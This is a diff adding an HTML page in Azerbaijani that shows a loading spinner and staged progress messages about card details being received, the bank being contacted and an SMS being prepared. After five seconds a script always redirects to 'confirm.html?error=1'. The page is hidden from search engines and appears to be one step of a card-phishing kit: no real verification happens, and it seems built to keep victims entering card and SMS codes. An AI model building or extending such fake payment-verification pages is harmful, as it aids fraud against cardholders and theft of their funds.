@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Yoxlanılır</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <style>
+        .loader {
+            width: 72px;
+            height: 72px;
+            border-radius: 999px;
+            background: conic-gradient(from 0deg, #2663EA, #93c5fd, #e0ecff, #2663EA);
+            position: relative;
+            animation: spinner 1.2s linear infinite;
+        }
+        
+        .loader::after {
+            content: '';
+            position: absolute;
+            inset: 8px;
+            background: white;
+            border-radius: inherit;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .9);
+        }
+        
+        @keyframes spinner {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .processing-line {
+            animation: pulseLine 1.8s ease-in-out infinite;
+        }
+        
+        .processing-line:nth-child(2) {
+            animation-delay: .25s;
+        }
+        
+        .processing-line:nth-child(3) {
+            animation-delay: .5s;
+        }
+        
+        .processing-line:nth-child(4) {
+            animation-delay: .75s;
+        }
+        
+        @keyframes pulseLine {
+            0%, 100% {
+                opacity: .55;
+                transform: translateX(0);
+            }
+            50% {
+                opacity: 1;
+                transform: translateX(4px);
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4 bg-white">
+    <div id="status-overlay" class="flex flex-col items-center justify-center p-9 text-center">
+        <div id="loader" class="loader mb-7"></div>
+        
+        <div id="success-icon" class="hidden w-20 h-20 bg-green-50 rounded-[28px] flex items-center justify-center mb-6 text-4xl text-green-500">
+            ✓
+        </div>
+        
+        <h3 id="status-title" class="text-2xl font-extrabold text-gray-950 mb-2">Yoxlanılır...</h3>
+        
+        <p id="status-desc" class="text-[#6B7280] text-sm leading-relaxed">
+            Məlumatlar yoxlanılır, zəhmət olmasa gözləyin.
+        </p>
+        
+        <div class="mt-8 w-full max-w-[290px] rounded-3xl bg-blue-50/80 border border-blue-100 p-4 text-left text-sm text-blue-950 space-y-3">
+            <p class="processing-line">✓ Kart məlumatları qəbul edildi</p>
+            <p class="processing-line">↳ Bank ilə əlaqə yaradılır...</p>
+            <p class="processing-line">↳ Kart yoxlanılır...</p>
+            <p class="processing-line">↳ SMS hazırlanır...</p>
+        </div>
+    </div>
+
+    <script>
+        // 5 saniyə sonra confirm.html səhifəsinə yönləndir və error parametri əlavə et
+        setTimeout(() => {
+            window.location.href = "confirm.html?error=1";
+        }, 5000);
+    </script>
+</body>
+</html>
